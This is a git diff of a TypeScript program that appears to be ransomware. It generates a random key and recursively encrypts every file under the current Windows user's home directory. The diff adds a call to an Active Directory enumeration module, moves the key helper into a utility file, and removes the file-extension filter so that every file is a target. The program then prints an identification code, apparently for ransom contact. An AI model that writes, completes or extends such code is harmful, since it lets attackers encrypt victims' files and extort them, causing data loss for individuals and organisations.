@@ -4,12 +4,13 @@ import crypto from 'crypto';
 import path from 'path';
 import config from './config.json';
 import https from 'https';
+import createRandomString from './utils/generateRandomString';
+import enumerateAD from './enumerateAd';
 
 const encrypt = () => {
+  enumerateAD();
   const userName: string = os.userInfo().username;
-  console.log(userName);
   const userDir: string = `C:\\Users\\${userName}`;
-
   console.log('Starting...\n');
 
   const key: string = createRandomString(32);
@@ -29,18 +30,6 @@ const encrypt = () => {
   console.log(`Identification Code : ${idCode}\n`);
 };
 
-const createRandomString = (length: number): string => {
-  const characters: string =
-    'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-  const charactersLength: number = characters.length;
-
-  let result: string = '';
-  for (let i = 0; i < length; i++)
-    result += characters.charAt(Math.floor(Math.random() * charactersLength));
-
-  return result;
-};
-
 const encryptDir = (dir: string, key: string, iv: Buffer) => {
   if (!fs.existsSync(dir)) return;
 
@@ -52,16 +41,6 @@ const encryptDir = (dir: string, key: string, iv: Buffer) => {
         encryptDir(fullPath, key, iv);
       } else {
         let isTarget: boolean = true;
-
-        // FODA SE EXTENSÃO
-        // check extension
-        // for (let j = 0; j < config.targetExtension.length; j++) {
-        //   if (fullPath.toLowerCase().endsWith(config.targetExtension[j])) {
-        //     console.log(j);
-        //     isTarget = true;
-        //     break;
-        //   }
-        // }
 
         if (isTarget) {
           let fileStat = fs.statSync(fullPath);
